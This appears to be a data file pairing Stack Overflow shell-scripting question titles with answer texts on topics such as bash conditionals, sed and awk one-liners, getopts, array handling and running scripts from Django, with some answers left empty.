    "Bash convention for if ; then": "This has become the style in the last few years:\nif [ -x \"$filename\" ]; then\n   echo \"hi\"\nfi\nHowever, back when dinosaurs like Burroughs and Sperry Rand ruled the earth, I learned to write if statements like this:\nif [ -x \"$filename\" ]\nthen\n    echo \"hi\"\nfi\nThen, you don't even need a semicolon.\nThe new style with then on the same line as the if started in order to emulate the way C and other programming languages did their if statements:\nif (! strcmp(\"foo\", \"bar\")) {\n   printf \"Strings equal\\n\";\n}\nThese programming languages put the opening curly brace on the same line as the if.",
    "Is it possible to do a grep with keywords stored in the array?": "args=(\"key1\" \"key2\" \"key3\")\npat=$(echo ${args[@]}|tr \" \" \"|\")\ngrep -Eow \"$pat\" file\nOr with the shell\nargs=(\"key1\" \"key2\" \"key3\")\nwhile read -r line\ndo\n    for i in ${args[@]}\n    do\n        case \"$line\" in\n            *\"$i\"*) echo \"found: $line\";;\n        esac\n    done\ndone <\"file\"",
    "BASH: Sudo Cat Multiline Commands to Shell Script": "sudo bash -c \"cat >> /etc/profile.d/maven.sh\" << EOL\nexport M2_HOME=/opt/apache-maven-3.1.1\nexport M2=\\$M2_HOME/bin\nPATH=\\$M2:\\$PATH\nEOL\nIf you don't fancy spawning a subshell, sudo tee -a /etc/profile.d/maven.sh > /dev/null << EOL works just as well.",
    "how to push folders from computer into sdcard using adb shell": "",
    "RegEx for \"does not begin with\"": "bash doesn't have a \"doesn't match regex\" operator; you can either negate (!) a test of the \"does match regex\" operator (=~):\nif [[ ! \"$line\" =~ ^02/18/13 ]]\nor use the \"doesn't match string/glob pattern\" operator (!=):\nif [[ \"$line\" != 02/18/13* ]]\nGlob patterns are just different enough from regular expressions to be confusing. In this case, the pattern is simple enough that the only difference is that globs are expected to match the entire string, and hence don't need to be anchored (in fact, it needs a wildcard to de-anchor the end of the pattern).",
    "Shell script: find maximum value in a sequence of integers without sorting": "You can use this if no negative number is expected:\nawk '$0>x{x=$0};END{print x}' input.txt\nUse this to support negative numbers:\nawk 'BEGIN{x=-2147483648};$0>x{x=$0};END{print x}' input.txt\nInitializing x allows the solution to properly handle integer lists with values <= 0. See the comments for more details.",
    "Embedding a Python shell inside a Python program": "You are looking for code - Interpreter base classes, particularly code.interact().\nSome examples from effbot.",
    "In a bash script, what would $'\\0' evaluate to and why?": "In bash, $'\\0' is precisely the same as '': an empty string. There is absolutely no point in using the special Bash syntax in this case.\nBash strings are always NUL-terminated, so if you manage to insert a NUL into the middle of a string, it will terminate the string. In this case, the C-escape \\0 is converted to a NUL character, which then acts as a string terminator.\nThe -d option of the read builtin (which defines a line-end character the input) expects a single character in its argument. It does not check if that character is the NUL character, so it will be equally happy using the NUL terminator of '' or the explicit NUL in $'\\0' (which is also a NUL terminator, so it is probably no different). The effect, in either case, will be to read NUL-terminated data, as produced (for example) by find's -print0 option.\nIn the specific case of read -d '' line <<< \"$var', it is impossible for $var to have an internal NUL character (for the reasons described above), so line will be set to the entire value of $var with leading and trailing whitespace removed. (As @mklement notes, this will not be apparent in the suggested code snippet, because read will have a non-zero exit status, even though the variable will have been set; read only returns success if the delimiter is actually found, and NUL cannot be part of a here-string.)\nNote that there is a big difference between\nread -d '' line\nand\nread -d'' line\nThe first one is correct. In the second one, the argument word passed to read is just -d, which means that the option will be the next argument (in this case, line). read -d$'\\0' line will have identical behaviour; in either case, the space is necessary. (So, again, no need for the C-escape syntax).",
    "In bash script, how to use function exit status in while loop condition": "Remove the test command - also known as [. So:\nwhile check1\ndo\n    # Loop while check1 is successful (returns 0)\n\n    if check1\n    then\n        echo 'check1 was successful'\n    fi\n\ndone\nShells derived from the Bourne and POSIX shells execute a command after a conditional statement. One way to look at it is that while and if test for success or failure, rather than true or false (although true is considered successful).\nBy the way, if you must test $? explicitly (which is not often required) then (in Bash) the (( )) construct is usually easier to read, as in:\nif (( $? == 0 ))\nthen\n    echo 'worked'\nfi",
    "Bash - Check if the string starts with a predefined string (substring)": "You can use this check in BASH:\n[[ \"$projectName\" == \"testProject\"* ]]",
    "How to extract all command history in one file linux": "You can use the\nhistory\ncommand, it displays all the history, and is not taking into consideration the 'very directory in which the history command was executed'.\nYou can output it to a file by using\nhistory >> file.txt\nTo see more about the history command, you can visit\nhttp://www.tldp.org/LDP/GNU-Linux-Tools-Summary/html/x1712.htm",
    "How to write a shell script that checks if git repository is up to date?": "I would rather use the solution of \"git: check if pull needed\":\ngit fetch origin\nreslog=$(git log HEAD..origin/master --oneline)\nif [[ \"${reslog}\" != \"\" ]] ; then\n  git merge origin/master # completing the pull\n  ...",
    "Find line number in a text file - without opening the file": "Maybe using grep like this:\ngrep -n -2 your_searched_for_string  your_large_text_file\nWill give you almost what you expect\n-n : tells grep to print the line number\n-2 : print 2 additional lines (and the wanted string, of course)",
    "Redhat Linux - change directory color": "To specify the colors of the output of ls, you need to set LS_COLORS. In your .zshrc, try adding:\nLS_COLORS=\"$LS_COLORS:di=00;33\"\n34 is blue, 33 is ... yellowish. Change that number and find what you like.\nUse dircolors to get a feel for what LS_COLORS should look like and add -p to see a color list.",
    "How to get Bash version number in OS X": "echo $BASH_VERSION works on Mac OS X as well:\n$ echo $BASH_VERSION\n3.2.57(1)-release\nIf you need to check if they have a newer bash installed, (such as via Homebrew or MacPorts) by calling the bash that is in their path, you can just execute that command from within that version of bash:\n$ bash -c 'echo $BASH_VERSION'\n4.3.30(1)-release\nTo get just one component of the version, there is an array, BASH_VERSINFO, so you can access each element individually. If you just want the major version (this is on my system, where my login shell is Bash 3 but I have Bash 4 installed for scripting):\n$ echo ${BASH_VERSINFO[0]}\n3\n$ bash -c 'echo ${BASH_VERSINFO[0]}'\n4\nYou can see the full contents of the array as well:\n$ echo \"${BASH_VERSINFO[@]}\"\n3 2 57 1 release x86_64-apple-darwin14\n$ bash -c 'echo \"${BASH_VERSINFO[@]}\"'\n4 3 30 1 release x86_64-apple-darwin14.0.0",
    "Setting shell script to utf8": "Bash takes care of your locale settings.\nCheck it with locale\nIf not in UTF-8, you do like this:\nexport LANG=C.UTF-8",
    "Multiple option arguments using getopts (bash)": "I think what you want is to get a list of values from a single option. For that, you can repeat the option as many times as needed, and add it's argument to an array.\n#!/bin/bash\n\nwhile getopts \"m:\" opt; do\n    case $opt in\n        m) multi+=(\"$OPTARG\");;\n        #...\n    esac\ndone\nshift $((OPTIND -1))\n\necho \"The first value of the array 'multi' is '$multi'\"\necho \"The whole list of values is '${multi[@]}'\"\n\necho \"Or:\"\n\nfor val in \"${multi[@]}\"; do\n    echo \" - $val\"\ndone\nThe output would be:\n$ /tmp/t\nThe first value of the array 'multi' is ''\nThe whole list of values is ''\nOr:\n\n$ /tmp/t -m \"one arg with spaces\"\nThe first value of the array 'multi' is 'one arg with spaces'\nThe whole list of values is 'one arg with spaces'\nOr:\n - one arg with spaces\n\n$ /tmp/t -m one -m \"second argument\" -m three\nThe first value of the array 'multi' is 'one'\nThe whole list of values is 'one second argument three'\nOr:\n - one\n - second argument\n - three",
    "Specify command line arguments like name=value pairs for shell script": "This worked for me:\nfor ARGUMENT in \"$@\"\ndo\n   KEY=$(echo $ARGUMENT | cut -f1 -d=)\n\n   KEY_LENGTH=${#KEY}\n   VALUE=\"${ARGUMENT:$KEY_LENGTH+1}\"\n\n   export \"$KEY\"=\"$VALUE\"\ndone\n\n# from this line, you could use your variables as you need\n\ncd $FOLDER\nmkdir $REPOSITORY_NAME\nUsage\nbash my_scripts.sh  FOLDER=\"/tmp/foo\" REPOSITORY_NAME=\"stackexchange\"\nFOLDER and REPOSITORY_NAME are ready to use in the script.\nIt does not matter what order the arguments are in.\nChangelog\nv1.0.0",
    "Portable way to find the number of processors/CPU's in a shell script?": "Here is a fairly portable function to get the number of processors that works in sh, bash and compatible shells:\nUses nproc on Linux.\nUse getconf as a fallback, it's and part of coreutils.\nTested to work on:\nLinux\nDarwin (macOS)\nFreeBSD, NetBSD, OpenBSD\n... probably others, feel free to test :)\nFeel free to suggest additions:\n#!/bin/sh\nportable_nproc() {\n    OS=\"$(uname -s)\"\n    if [ \"$OS\" = \"Linux\" ]; then\n        NPROCS=\"$(nproc --all)\"\n    elif [ \"$OS\" = \"Darwin\" ] || \\\n         [ \"$(echo \"$OS\" | grep -q BSD)\" = \"BSD\" ]; then\n        NPROCS=\"$(sysctl -n hw.ncpu)\"\n    else\n        NPROCS=\"$(getconf _NPROCESSORS_ONLN)\"  # glibc/coreutils fallback\n    fi\n    echo \"$NPROCS\"\n}\n\n# test\nportable_nproc\nA more terse command that covers many systems is to check getconf for glibc, then sysctl for BSD family of Unixes: eg:\ngetconf _NPROCESSORS_ONLN 2>/dev/null || sysctl -n hw.ncpu\nI have a slight preference for checking each platform since it allows others to be added more easily, but in practice the single line works in many cases.",
    "groovy script - sh with variable": "",
    "How to create csv file using shell script": "You may just do:\necho \"$host, `date`, checkout,$Time_checkout\" >> log.csv\necho \"$host, `date`, add, $Time_add\" >> log.csv\necho \"$host, `date`, cimmit, $Time_commits\" >> log.csv",
    "how to ensure yum install was successful in a shell script?": "I've used the following method, which might not be foolproof, but seems to work:\nAssuming the variable PACKAGES contains the list of packages you want to install, then:\nRun yum -y install $PACKAGES (I assume if this is a script, you really want to pass -y to avoid prompting).\nCheck its exit status in order to detect some failure conditions.\nRun rpm --query --queryformat \"\" $PACKAGES, which will output nothing for each package that was installed successfully, and will output package <name> is not installed for each failure.\nCheck its exit status, which appears to be the number of packages that were not successfully installed, i.e. will be 0 on success as usual.\nThis will only work if PACKAGES contains plain package names that yum is expected to find in a repository, not if it contains other things that yum accepts like URLs, file names or Provides: names.",
    "How can I limit output to the terminal width": "pstree seems to think that you don't want wrapped output, thus it asks the terminal about its width and outputs just as much. top and ps behave similar.\nYou can avoid this by piping the output through cat:\npstree | cat\nEdit: Ah, I see that you want not avoid it, but add the chopping.\nAn easy way is piping the output of your command through less -S (or less --chop-long-lines, more verbosely). (You may want to combine this with some other options, see the manual page, depending on your preferences).\npstree | grep MDSImporte | less -SEX\nwill show your the lines cut off at terminal size.",
    "How can I find the location of the tcsh shell script I'm executing?": "In c shell, try like this:\nset rootdir = `dirname $0`\nset abs_rootdir = `cd $rootdir && pwd`\necho $abs_rootdir",
    "How to empty an array in bash script": "unset works with variable names, not the values they keep. So:\nunset arr1\nor, if you want to empty it:\narr1=()",
    "How to check if a file name matches regex in shell script": "There is a confusion between regexes and the simpler \"glob\"/\"wildcard\"/\"normal\" patterns \u2013 whatever you want to call them. You're using the latter, but call it a regex.\nIf you want to use a pattern, you should\nQuote it when assigning1:\n  fileNamePattern=\"abcd_????_def_*.txt\"\nYou don't want anything to expand quite yet.\nMake it match the complete path. This doesn't match:\n  $ mypath=\"/mydir/myfile1.txt\"\n  $ mypattern=\"myfile?.txt\"\n  $ [[ $mypath == $mypattern ]] && echo \"Matches!\" || echo \"Doesn't match!\"\n  Doesn't match!\nBut after extending the pattern to start with *:\n  $ mypattern=\"*myfile?.txt\"\n  $ [[ $mypath == $mypattern ]] && echo \"Matches!\" || echo \"Doesn't match!\"\n  Matches!\nThe first one doesn't match because it matches only the filename, but not the complete path. Alternatively, you could use the first pattern, but remove the rest of the path with parameter expansion:\n  $ mypattern=\"myfile?.txt\"\n  $ mypath=\"/mydir/myfile1.txt\"\n  $ echo \"${mypath##*/}\"\n  myfile1.txt\n  $ [[ ${mypath##*/} == $mypattern ]]  && echo \"Matches!\" || echo \"Doesn't match!\"\n  Matches!\nUse == and not =~, as shown in the above examples. You could also use the more portable = instead, but since we're already using the non-POSIX [[ ]] instead of [ ], we can as well use ==.\nIf you want to use a regex, you should:\nWrite your pattern as one: ? and * have a different meaning in regexes; they modify what they stand after, whereas in glob patterns, they can stand on their own (see the manual). The corresponding pattern would become:\n  fileNameRegex='abcd_.{4}_def_.*\\.txt'\nand could be used like this:\n  $ mypath=\"/data/file/abcd_12bd_def_ghijk.txt\"\n  $ [[ $mypath =~ $fileNameRegex ]] && echo \"Matches!\" || echo \"Doesn't match!\"\n  Matches!\nKeep your habit of writing the regex into a separate parameter and then use it unquoted in the conditional operator [[ ]], or escaping gets very messy \u2013 it's also more portable across Bash versions.\nThe BashGuide has a great article about the different types of patterns in Bash.\nNotice that quoting your parameters is almost always a good habit. It's not required in conditional expressions in [[ ]], and actually suppresses interpretation of the right-hand side as a pattern or regex. If you were using [ ] (which doesn't support regexes and patterns anyway), quoting would be required to avoid unexpected side effects of special characters and empty strings.\n1 Not exactly true in this case, actually. When assigning to a variable, the manual says that the following happens:\n[...] tilde expansion, parameter and variable expansion, command substitution, arithmetic expansion, and quote removal [...]\ni.e., no pathname (glob) expansion. While in this very case using\nfileNamePattern=abcd_????_def_*.txt\nwould work just as well as the quoted version, using quotes prevents surprises in many other cases and is required as soon as you have a blank in the pattern.",
    "Best way to overwrite file with itself": "You cannot generically do this in one step because writing to the file can interfere with reading from it. If you try this on a regular file, it's likely the > redirection will blank the file out before anything is even read.\nYour safest bet is to split it into two steps. You can hide it behind a function call if you want.\nrewrite() {\n    local file=$1\n\n    local contents=$(< \"$file\")\n    cat <<< \"$contents\" > \"$file\"\n}\n\n...\n\nrewrite /sys/misc/whatever",
    "how to parse a config file (*.conf) in shell script?": "I'd do this:\npw=$(awk '/^password/{print $3}' app.conf)\n\nuser=$(awk '/^user/{print $3}' app.conf)\n\n\necho $pw\nroot123\n\necho $user\nroot\nThe $() sets the variable pw to the output of the command inside. The command inside looks through your app.conf file for a line starting password and then prints the 3rd field in that line.\nEDITED\nIf you are going to parse a bunch of values out of your config file, I would make a variable for the config file name:\nCONFIG=app.conf\npw=$(awk '/^password/{print $3}' \"${CONFIG}\")\nuser=$(awk '/^user/{print $3}' \"${CONFIG}\")\nHere's how to do the two different ports... by setting a flag to 1 when you come to the right section and exiting when you find the port.\nmport=$(awk '/^\\[MySQL\\]/{f=1} f==1&&/^port/{print $3;exit}' \"${CONFIG}\")\nsport=$(awk '/^\\[Server\\]/{f=1} f==1&&/^port/{print $3;exit}' \"${CONFIG}\")",
    "What's the \"p\" permission found on /var/run/screen/ ...?": "p stands for FIFO, a named pipe. So it's not a permission, but a file type (just like d for directory).\nYou can't use cat or tail to get its content, because a FIFO isn't a regular file, it's used for inter-process communication.",
    "Bash arrays: appending and prepending to each element in array": "You cannot do it simultaneously easily. Fortunately, you do not need to:\nignore=( archive crl cfg                    )\nignore=( \"${ignore[@]/%/\\\" -prune}\"         )\nignore=( \"${ignore[@]/#/-o -path \\\"\\$dir/}\" )\n\necho ${ignore[@]}\nNote the parentheses and double quotes - they make sure the array contains three elements after each substitution, even if there are spaces involved.",
    "select multiple lines using the linux command sed": "With sed you're allowed to specify addresses by number like so:\nsed -n '3,6p'\nThe -n is to keep sed from automatically printing output.\nThen you can run multiple commands if you're using gsed by separating those commands with semicolons:\nsed -n '3,6p; 11,13p' | sort -k2 > 3_6-11_13",
    "Bash/sh 'if else' statement": "You're running into a stupid limitation of the way sh expands arguments. Line 3 of your script is being expanded to:\nif [ != ]\nWhich sh can't figure out what to do with. Try this nasty hack on for size:\nif [ x$JAVA_HOME != x ]\nBoth arguments have to be non-empty, so we'll just throw an x into both of them and see what happens.\nAlternatively, there's a separate operator for testing if a string is non-empty:\nif [ !-z $JAVA_HOME ]\n(-z tests if the following string is empty.)",
    "tail and grep log and mail (linux)": "You want to send an email when emailing errors occur? That might fail ;)\nYou can however try something like this:\ntail -f $log |\ngrep --line-buffered error |\nwhile read line\ndo\n    echo \"$line\" | mail -s subject \"$email\"\ndone\nWhich for every line in the grep output sends an email.\nRun above shell script with\nnohup ./monitor.sh &\nso it will keep running in the background.",
    "Regex in KornShell": "case $month in\n    [0-9][0-9]) echo \"ok\";;\n    *) echo \"no\";;\nesac\nshould work.\nIf you need full regexp search, you can use egrep like this:\nif echo $month | egrep -q '^[0-9]{2}$'\nthen\n    echo \"ok\"\nelse\n    echo \"no\"\nfi",
    "How to remove files without certain extension?": "Try this.\nfind . -type f ! -name \"*.exe\" ! -name \"*.txt\" -exec rm {} \\;\nThe above command will remove all the files other than the .exe and .txt extension files in the current directory and sub directory recursively.",
    "Hadoop fs -du-h sorting by size for M, G, T, P, E, Z, Y": "hdfs dfs -du -h <PATH> | sed 's/ //' | sort -hr\nsed will strip out the space between the number and the unit, after which sort will be able to understand it.",
    "how to \"docker run\" a shell session on a minimal linux install and immediately tear down the container?": "Please use -rm flag of docker run command. --rm=true or just --rm.\nIt automatically remove the container when it exits (incompatible with -d). Example:\ndocker run -i -t --rm=true centos /bin/bash\nor\ndocker run -i -t --rm centos /bin/bash",
    "Cross-platform command line script (e.g. .bat and .sh)": "You could use this:\nrem(){ :;};rem '\n@goto b\n';echo sh;exit\n:b\n@echo batch\nIt's valid shell script and batch, and will execute different blocks depending on how it's run.\nModify the echo and @echo lines to do what you want.",
    "How to resume stopped job on a remote machine given pid?": "You will need to find the PID and then issue kill -CONT <pid>.\nYou can find the PID by using ps with some options to produce extended output. Stopped jobs have a T in the STAT (or S) column.\nIf you succeed in continuing the process but it no longer has a controlling terminal (and it needs one) then it could possibly hang or go into a loop: just keep your eye on its CPU usage.",
    "list of file owners in folder on linux": "stat -c \"%U\" *| sort -u",
    "SSH login with expect(1). How to exit expect and remain in SSH? [duplicate]": "I think your problem has been solved here before:\nUsing expect to pass a password to ssh\nThe command you're looking for is interact. It hands the control over to you/your keyboard.",
    "Using bg and fg with a given PID": "You cannot use fg and bg with a pid. They are shell builtin-s which require a jobspec, not a pid.",
    "can't export a variable from execute shell in Jenkins to other project (with using properties file)": "",
    "How to find Linux Distribution name using shell script?": "$ lsb_release -i\nDistributor ID: Fedora\n$ lsb_release -i | cut -f 2-\nFedora",
    "Using Windows command shell for creating multiple files": "for /l %a in (1 1 10) do type nul > \"%a.txt\"\nFor each value in the sequence from 1 in steps of 1 up to 10, create (> redirection) a empty file (type nul reads nothing and writes nothing) using the value in the sequence as filename (the value in the for replaceable parameter)\nThe command is written to be used from command line. Inside a batch file percent signs need to be escaped (doubling them), replacing %a with %%a",
    "How does one locate a .zshrc file?": "Sure. If it's not there already, create it yourself.\n$ touch ~/.zshrc",
    "How to generate HTML documentation for SWIFT files in Xcode with HeaderDoc?": "",
    "Merge two properties file using shell scripts": "Another way:\n$ awk -F= '!a[$1]++' first.properties second.properties\nThe input to this awk is the content of first file followed by second file. !a[$1]++ prints only the first occurence of a particular key, hence removing duplicates apparing in the 2nd file.",
    "Reading a specific line of a file": "You could use sed.\n# print line number 10\n$ sed -n '10p' file_name\n$ sed '10!d' file_name\n$ sed '10q;d' file_name",
    "Special variables in Unix shells? [closed]": "Here: http://sillydog.org/unix/scrpt/scrpt2.2.2.php\n$1 - $9 these variables are the positional parameters.\n$0 the name of the command currently being executed.\n$# the number of positional arguments given to this invocation of the shell.\n$? the exit status of the last command executed is given as a decimal string. When a command completes successfully, it returns the exit status of 0 (zero), otherwise it returns a non-zero exit status.\n$$ the process number of this shell - useful for including in filenames, to make them unique.\n$! the process id of the last command run in the background.\n$- the current options supplied to this invocation of the shell.\n$* a string containing all the arguments to the shell, starting at $1.\n$@ same as above, except when quoted.\nMore resources :\nhttp://linuxshellaccount.blogspot.com/2008/04/shell-special-variables-in-bash.html\nhttp://www.tutorialspoint.com/unix/unix-special-variables.htm",
    "Boolean Expressions in Shell Scripts": "The other solutions have a couple of common mistakes: http://www.pixelbeat.org/programming/shell_script_mistakes.html\nfor i in $(ls ...) is redundant/problematic just do: for i in $1/resources*; do ...\n[ $i != file1 -a $1 != file2 ] This actually has 2 problems.\na. The $i is not quoted, hence names with spaces will cause issues\nb. -a is inefficient if stating files as it doesn't short circuit (I know the above is not stating files).\nSo instead try:\nfor i in $1/resources/*; do\n    if [ \"$i\" != \"database.db\" ] &&\n       [ \"$i\" != \"tiles\" ] &&\n       [ \"$i\" != \"map.pdf\" ] &&\n       [ \"$i\" != \"map.png\" ]; then\n        svn export -q \"$i\" \"../MyProject/Resources/$(basename $i)\"\n    fi\ndone",
    "Editing a line in multiple lines in Mongo shell": "A different approach would be to not paste multi-line blocks into the shell directly. Instead, you can use the edit helper.\nIn the .mongorc.js file found in your home directory, you can define what editor you would like to use:\nEDITOR=\"vim\"\nThen while in the shell you can issue the edit command\nedit foo\nThis will present you with an empty page where you can set foo to be a query document\n{ name: \"bar\" }\na function\nfunction foo() {\n  print(\"BAR!\");\n}\nor probably most usefully an aggregate query\n[\n  {\n    $match: {\n      name: \"bar\"\n    }\n  },\n  {\n    $group: {\n      _id: null,\n      ageSum: {\n        $sum: \"$age\"\n      }\n    }\n  },\n  {\n    $project: {\n      _id: 0,\n      n: \"$name\",\n      a: \"ageSum\"\n    }\n  }\n]\ndb.test.aggregate(foo)",
    "Execute OS specific script in node / Grunt": "You could take advantage of node's process.platform:\nprocess.platform\nWhat platform you're running on: 'darwin', 'freebsd', 'linux', 'sunos' or 'win32'\nconsole.log('This platform is ' + process.platform);\nThen within the code, optionally add the file extensions based on that:\nif (process.platform === \"win32\") {\n    ext = \".cmd\";\n} else {\n    ext = \".sh\";\n}",
    "Speed up clojure startup time with nailgun": "Debian\nDo the following once:\napt-get install nailgun                          # install nailgun\njava -server -jar /usr/share/java/nailgun.jar&   # run nailgun server\nng-nailgun ng-cp /usr/share/java/clojure-1.4.jar # add clj to classpath\nNow that the server is running and configured, you can run your clojure scripts on it:\nng-nailgun clojure.main path/to/myscript.clj\nIn my case, startup time of the actual script went down to 80ms, compared to 900ms without nailgun.\nTo make running the actual script more convenient, create an executable file ng-clojure containing the following line, and put it somewhere in your path:\nng-nailgun clojure.main \"$@\"\nIn your clojure shell script, add this as the first line:\n#!/usr/bin/env ng-clojure\nThen make the clojure shell script executable and run it like\npath/to/myscript.clj\nOSX\nbrew install nailgun\nng-server \nng ng-cp ~/.m2/repository/org/clojure/clojure/1.5.1/clojure-1.5.1.jar \nThen execute your script as above.\nUpdate: Having used it for a while, it doesn't seem to work flawlessly. Sometimes I'm getting random errors that don't occur when running without nailgun, and sometimes there seems to be a memory leak that makes the nailgun JVM consume all memory over time, eventually making the system swap to disk. Haven't memory profiled this yet, but wanted to add this heads-up.",
    "Clearing Screen in Swipl prolog in windows [duplicate]": "On unix terminals, there is the library(tty) resource and that has tty_clear/0, but windows terminals do not support the terminal library. However, they do support ANSI Escape Codes.\nEscape codes are character sequences starting with the ESC (escape) character, ASCII 0x1B = 27. Most start with the control sequence introducer, which is the escape followed by a left bracker: ESC [, known as the CSI.\nSo you can issue the code sequence for a screen clear, which is the ED (Erase Data) command, which takes the form:\nCSI 2 J   -- which expands to: ESC [ 2 J\nFrom SWI-Prolog this can be issued using the format/2 primitive.\nformat('~c~s', [0x1b, \"[2J\"]). % issue CSI 2 J\nThe ED 2 command, full terminal clear, on the MSDOS ANSI handling resets the cursor to top-left, but that is not necessarily the case on all terminals, so best to combine with the CUP (Cursor Position) command, which as a reset to home is simply: CSI H.\nformat('~c~s~c~s', [0x1b, \"[H\", 0x1b, \"[2J\"]). % issue CSI H CSI 2 J\nUpdate: Simplification\nThanks to @CapelliC for an alternate and clearer form, using the \\e escape code for escape!\nPlain clear screen:\ncls :- write('\\e[2J').\nOr with home reset:\ncls :- write('\\e[H\\e[2J').",
    "Open file in default editor from bash": "Mostly close to this is xdg-open:\n$ xdg-open somefile.ext",
    "Shell Script: How to trim spaces from a bash variable [duplicate]": "I can think of two options:\nvariable=\"  gfgergj lkjgrg  \"\necho $variable | sed 's,^ *,,; s, *$,,'\nor else\nnospaces=${variable## } # remove leading spaces\nnospaces=${variable%% } # remove trailing spaces",
    "'Unexpected end of file' and 'error importing function definition' error running shellscript using qsub": "Also have this problem in a wrapper script that uses\nqsub -shell no -b yes -cwd -V somescript.bash arg1 arg2 etc\nif you use it to submit another bash shell script. It produces the annonying\n/bin/sh: module: line 1: syntax error: unexpected end of file\n/bin/sh: error importing function definition for `BASH_FUNC_module'\n(this is Sun Grid Engine 211.11 running on CentOS 6.6) Turns out things are solved by simply putting the following on top of the wrapper script (not of the wrapped script):\nunset module\nThat's all.",
    "How can I tell if a makefile is being run from an interactive shell?": "It isn't strictly determining whether it is invoked from an interactive shell or not, but for a cron job in which the output is redirected to a file, the answer to this question would be the same as for How to detect if my shell script is running through a pipe?:\nif [ -t 0 ]\nthen\n    # input is from a terminal\nfi\nEdit: To use this to set a variable in a Makefile (in GNU make, that is):\nINTERACTIVE:=$(shell [ -t 0 ] && echo 1)\n\nifdef INTERACTIVE\n# is a terminal\nelse\n# cron job\nendif",
    "Run bash script with Django": "You can do this with empty form.\nIn your template make a empty form\n# index.html\n<form action=\"{% url 'run_sh' %}\" method=\"POST\">\n    {% csrf_token %}\n    <button type=\"submit\">Call</button>\n</form>\nAdd url for your form\nfrom django.conf.urls import url\n\nfrom . import views\n\nurlpatterns = [\n    url(r'^run-sh/$', views.index, name='run_sh')\n]\nNow in your views.py you need to call the bash.sh script from the view that returns your template\nimport subprocess\n\ndef index(request):\n    if request.POST:\n        # give the absolute path to your `text4midiAllMilisecs.py`\n        # and for `tiger.mid`\n        # subprocess.call(['python', '/path/to/text4midiALLMilisecs.py', '/path/to/tiger.mid'])\n\n        subprocess.call('/home/user/test.sh')\n\n    return render(request,'index.html',{})\nMy test.sh is in the home directory. Be sure that the first line of bash.sh have sh executable and also have right permission. You can give the permissions like this chmod u+rx bash.sh.\nMy test.sh example\n#!/bin/sh\necho 'hello'\nFile permision ls ~\n-rwxrw-r--   1 test test    10 Jul  4 19:54  hello.sh*",
    "Upload an image from Django shell": "I'd been bit by this before, so I feel you -- but as per my comment: replace the 'r' with 'rb' in the File() call, and it should work fine.\nI should also add, for those who come upon this answer later, that this is an issue specific to Python3. Take a look at the SO link in Steve's comment for a fuller explanation of the difference in File() between p2 and p3.",
    "Output for loop to a file": "You are using > redirection, which wipes out the existing contents of the file and replaces it with the command's output, inside the loop. So this wipes out the previous contents 10 times, replacing it with one line each time.\nWithout the >, or with >/dev/tty, it goes to your display, where > cannot wipe anything out so you see all ten copies.\nYou could use >>, which will still open the file ten times, but will append (not wipe out previous contents) each time. That's not terribly efficient though, and it retains data from a previous run (which may or may not be what you want).\nOr, you can redirect the entire loop once:\nfor ... do cmd; done >file\nwhich runs the entire loop with output redirected, creating (or, with >>, opening for append) only once.",
    "Extract multiple captured groups from sed to variables": "If there are any characters that you know will not appear in THIS, THAT, or WHAT, then you can write something like this:\nIFS=$'\\t' read -r VAR1 VAR2 VAR3 \\\n    < <(sed 's/^abc <\\(.*\\)> abc <\\(.*\\)> abc <\\(.*\\)> abc$/\\1\\t\\2\\t\\3/' \\\n             <<< \"$TEXT\"\n       )\ntelling sed to use that separator in its output, and read to use that separator in its input.",
    "\"more\" command alternative that does support colors? [closed]": "Most commands that can output color have an option to choose between:\nON: Always output color\nOFF: Never output color\nAUTO: Show color if and only if the output is a terminal\nMany commands work automatically in color AUTO mode. That is the case for emerge. And that is why you do not have color when you pipe the output: the pioe is not a terminal.\nThe solution is to tell emerge to output the colors unconditionally. And tell less not to filter them, of course.\nTry:\nemerge --color y | less -R",
    "How do I pick random unique lines from a text file in shell?": "This might work for you:\nshuf -n3 file\nshuf is one of GNU coreutils.",
    "Shell script detecting running in Cygwin": "You can use the uname utility. From uname(1):\n-o, --operating-system\nprint the operating system\nExample code:\nif [ `uname -o` = \"Cygwin\" ]\nthen\n    # Cygwin specific stuff\nelse\n    # Other UNIX (Linux, etc.) specific stuff\nfi",
    "Efficient way to get your IP address in shell scripts": "you can do it with just one awk command. No need to use too many pipes.\n$ ifconfig | awk -F':' '/inet addr/&&!/127.0.0.1/{split($2,_,\" \");print _[1]}'",
    "What UNIX commands support coloured output?": "Why don't you try:\nman -K color\nThat should search for the word color in all your man pages (content, not just headings).\nIt asks, for each man page, whether you want to open and view the page:\n$ man -K color\n/usr/share/man/mann/Widget.n.gz? [ynq] y\n/usr/share/man/mann/usual.n.gz? [ynq] y\n/usr/share/man/mann/Toplevel.n.gz? [ynq] n\n/usr/share/man/mann/itk.n.gz? [ynq] n\n/usr/share/man/mann/Archetype.n.gz? [ynq] n\n/usr/share/man/man8/squid.8.gz? [ynq] n\n/usr/share/man/man7/Xprint.7.gz? [ynq]\n/usr/share/man/man7/X.7.gz? [ynq]\n/usr/share/man/man7/urxvt.7.gz? [ynq]\n/usr/share/man/man7/term.7.gz? [ynq] q\n\n$\nInside each individual man page, you can use your normal search method (e.g., /color<ENTER>) for finding the text. When done with a man page, just exit and it will continue searching.",
    "Generate disk usage graphs/charts with CLI only tools in Linux": "If some ASCII chars are \"graphical\" enough for you, I can recommend ncdu. It is a very nice interactive CLI tool, which helps me a lot to step down large directories without doing cd bigdir ; du -hs over and over again.",
    "Bash, is subshell output implicitly quoted": "The output from command substitution ($()) is not implicitly quoted:\n$ for i in $(echo \"foo bar\"); do echo $i; done\nfoo                           \nbar\nThe loop above splits the unquoted output along words. We can prevent this behavior by quoting the result:\n$ for i in \"$(echo \"foo bar\")\"; do echo $i; done\nfoo bar\nHowever, when assigning a variable, as in your example, the result of the subshell is not split, even without quotes:\n$ baz=$(echo \"foo bar\")\n$ echo \"$baz\"\nfoo bar\nUnlike StackOverflow's syntax highlighting, the shell understands quotes inside command substitution, so we don't need to escape nested quotes:\n$ baz=\"foo\"\n$ echo \"$(echo \"$baz $(echo \"bar\")\")\"\nfoo bar",
    "apt-get: How to bypass pressing ENTER": "",
    "How to add 100 spaces at end of each line of a file in Unix": "If you want to have fixed n chars per line (don't trust the input file has exact m chars per line) follow this. For the input file with varying number of chars per line:\n$ cat file\n1\n12\n123\n1234\n12345\nextend to 10 chars per line.\n$ awk '{printf \"%-10s\\n\", $0}' file | cat -e\n\n1         $\n12        $\n123       $\n1234      $\n12345     $\nObviously change 10 to 200 in your script. Here $ shows end of line, it's not there as a character. You don't need cat -e, here just to show the line is extended.",
